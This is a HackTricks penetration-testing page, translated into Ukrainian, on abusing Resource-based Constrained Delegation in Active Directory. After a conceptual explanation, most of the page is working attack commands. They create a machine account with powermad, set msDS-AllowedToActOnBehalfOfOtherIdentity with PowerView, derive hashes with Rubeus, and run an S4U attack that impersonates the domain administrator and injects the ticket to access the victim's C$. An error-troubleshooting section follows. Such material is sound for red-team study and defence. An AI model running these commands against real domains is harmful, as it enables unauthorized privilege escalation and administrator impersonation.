# Resource-based Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Основи ресурсно-орієнтованої обмеженої делегації

Це схоже на базову [обмежену делегацію](constrained-delegation.md), але **замість** надання дозволів **об'єкту** на **виконання дій від імені будь-якого користувача проти служби**. Ресурсно-орієнтована обмежена делегація **встановлює** в **об'єкті, хто може виконувати дії від імені будь-якого користувача проти нього**.

У цьому випадку обмежений об'єкт матиме атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з ім'ям користувача, який може виконувати дії від імені будь-якого іншого користувача проти нього.

Ще одна важлива відмінність цієї обмеженої делегації від інших делегацій полягає в тому, що будь-який користувач з **права на запис над обліковим записом комп'ютера** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/тощо_) може встановити _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (в інших формах делегації вам потрібні були права адміністратора домену).

### Нові концепції

У попередній обмеженій делегації говорилося, що **`TrustedToAuthForDelegation`** прапор у значенні _userAccountControl_ користувача потрібен для виконання **S4U2Self.** Але це не зовсім правда.\
Реальність полягає в тому, що навіть без цього значення ви можете виконати **S4U2Self** проти будь-якого користувача, якщо ви є **службою** (маєте SPN), але якщо ви **маєте `TrustedToAuthForDelegation`**, повернутий TGS буде **Forwardable**, а якщо ви **не маєте** цього прапора, повернутий TGS **не буде** **Forwardable**.

Однак, якщо **TGS**, використаний у **S4U2Proxy**, **НЕ Forwardable**, спроба зловживання **базовою обмеженою делегацією** **не спрацює**. Але якщо ви намагаєтеся експлуатувати **ресурсно-орієнтовану обмежену делегацію, це спрацює** (це не вразливість, це функція, очевидно).

### Структура атаки

> Якщо у вас є **права на запис, еквівалентні привілеям** над **обліковим записом комп'ютера**, ви можете отримати **привілейований доступ** до цього комп'ютера.

Припустимо, що зловмисник вже має **права на запис, еквівалентні привілеям над комп'ютером жертви**.

1. Зловмисник **компрометує** обліковий запис, який має **SPN**, або **створює один** (“Служба A”). Зверніть увагу, що **будь-який** _адміністратор_ без будь-яких інших спеціальних привілеїв може **створити** до 10 **об'єктів комп'ютера (**_**MachineAccountQuota**_**)** і встановити їм **SPN**. Тож зловмисник може просто створити об'єкт комп'ютера та встановити SPN.
2. Зловмисник **зловживає своїм правом на запис** над комп'ютером жертви (Служба B), щоб налаштувати **ресурсно-орієнтовану обмежену делегацію, щоб дозволити Службі A виконувати дії від імені будь-якого користувача** проти цього комп'ютера жертви (Служба B).
3. Зловмисник використовує Rubeus для виконання **повної атаки S4U** (S4U2Self і S4U2Proxy) від Служби A до Служби B для користувача **з привілейованим доступом до Служби B**.
1. S4U2Self (з компрометованого/створеного облікового запису SPN): Запит на **TGS адміністратора для мене** (не Forwardable).
2. S4U2Proxy: Використовуйте **не Forwardable TGS** з попереднього кроку, щоб запитати **TGS** від **адміністратора** до **хоста жертви**.
3. Навіть якщо ви використовуєте не Forwardable TGS, оскільки ви експлуатуєте ресурсно-орієнтовану обмежену делегацію, це спрацює.
4. Зловмисник може **передати квиток** і **виконати дії від імені** користувача, щоб отримати **доступ до жертви Служби B**.

Щоб перевірити _**MachineAccountQuota**_ домену, ви можете використовувати:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені, використовуючи [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування R**esource-based Constrained Delegation**

**Використання модуля PowerShell activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної атаки S4U

По-перше, ми створили новий об'єкт Комп'ютера з паролем `123456`, тому нам потрібен хеш цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер можна виконати атаку:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків, просто запитавши один раз, використовуючи параметр `/altservice` Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Зверніть увагу, що у користувачів є атрибут під назвою "**Не може бути делегований**". Якщо у користувача цей атрибут встановлено в True, ви не зможете його імплементувати. Цю властивість можна побачити в bloodhound.
{% endhint %}

### Доступ

Остання команда виконає **повну атаку S4U і впровадить TGS** від адміністратора до жертви в **пам'яті**.\
У цьому прикладі було запитано TGS для служби **CIFS** від адміністратора, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними сервісними квитками

Дізнайтеся про [**доступні сервісні квитки тут**](silver-ticket.md#available-services).

## Помилки Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що kerberos налаштовано на те, щоб не використовувати DES або RC4, а ви надаєте лише хеш RC4. Надайте Rubeus принаймні хеш AES256 (або просто надайте йому хеші rc4, aes128 і aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Це означає, що час поточного комп'ютера відрізняється від часу DC, і kerberos не працює належним чином.
* **`preauth_failed`**: Це означає, що вказане ім'я користувача + хеші не працюють для входу. Ви могли забути вставити "$" в ім'я користувача під час генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Це може означати:
* Користувач, якого ви намагаєтеся видати за іншого, не може отримати доступ до бажаного сервісу (тому що ви не можете видати його за іншого або тому, що у нього недостатньо привілеїв)
* Запитуваний сервіс не існує (якщо ви запитуєте квиток для winrm, але winrm не працює)
* Створений fakecomputer втратив свої привілеї над вразливим сервером, і вам потрібно їх повернути.

## Посилання

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Дізнайтеся та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Дізнайтеся та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
